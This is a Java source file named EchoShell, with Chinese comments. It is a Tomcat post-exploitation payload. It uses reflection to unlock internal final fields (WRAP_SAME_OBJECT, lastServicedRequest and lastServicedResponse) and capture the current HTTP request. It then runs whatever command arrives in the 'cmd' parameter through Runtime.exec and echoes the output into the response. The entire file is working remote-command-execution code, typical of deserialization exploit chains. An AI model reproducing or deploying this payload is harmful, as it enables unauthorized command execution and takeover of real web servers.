import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class EchoShell {
    public void Echo() {
        javax.servlet.http.HttpServletMapping mapping;
        try {
            Class applicationDispatcher;
            Field WRAP_SAME_OBJECT_FIELD =null;
            try{
                applicationDispatcher = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
                WRAP_SAME_OBJECT_FIELD = applicationDispatcher.getDeclaredField("WRAP_SAME_OBJECT");
            }catch (Exception e){
                //tomcat6 修改STRICT_SERVLET_COMPLIANCE变量
                applicationDispatcher =  Class.forName("org.apache.catalina.Globals");
                WRAP_SAME_OBJECT_FIELD =applicationDispatcher.getDeclaredField("STRICT_SERVLET_COMPLIANCE");
            }
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            // 利用反射修改 final 变量 ，不这么设置无法修改 final 的属性
            Field f0 = Class.forName("java.lang.reflect.Field").getDeclaredField("modifiers");
            f0.setAccessible(true);
            f0.setInt(WRAP_SAME_OBJECT_FIELD,WRAP_SAME_OBJECT_FIELD.getModifiers()& ~Modifier.FINAL);

            Class applicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            Field lastServicedRequestField = applicationFilterChain.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = applicationFilterChain.getDeclaredField("lastServicedResponse");
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);
            f0.setInt(lastServicedRequestField,lastServicedRequestField.getModifiers()& ~Modifier.FINAL);
            f0.setInt(lastServicedResponseField,lastServicedResponseField.getModifiers()& ~Modifier.FINAL);

            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(applicationFilterChain);
            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(applicationFilterChain);

            String cmd = lastServicedRequest!=null ? lastServicedRequest.get().getParameter("cmd"):null;

            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(applicationDispatcher) || lastServicedRequest == null || lastServicedResponse == null){
                WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher,true);
                lastServicedRequestField.set(applicationFilterChain,new ThreadLocal());
                lastServicedResponseField.set(applicationFilterChain,new ThreadLocal());
            } else if (cmd!=null){
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                StringBuilder sb = new StringBuilder("");
                byte[] bytes = new byte[1024];
                int line = 0;
                while ((line = inputStream.read(bytes))!=-1){
                    sb.append(new String(bytes,0,line));
                }
                Writer writer = lastServicedResponse.get().getWriter();
                writer.write(sb.toString());
                writer.flush();
            }

        } catch (Exception e){
            e.printStackTrace();
        }
    }

}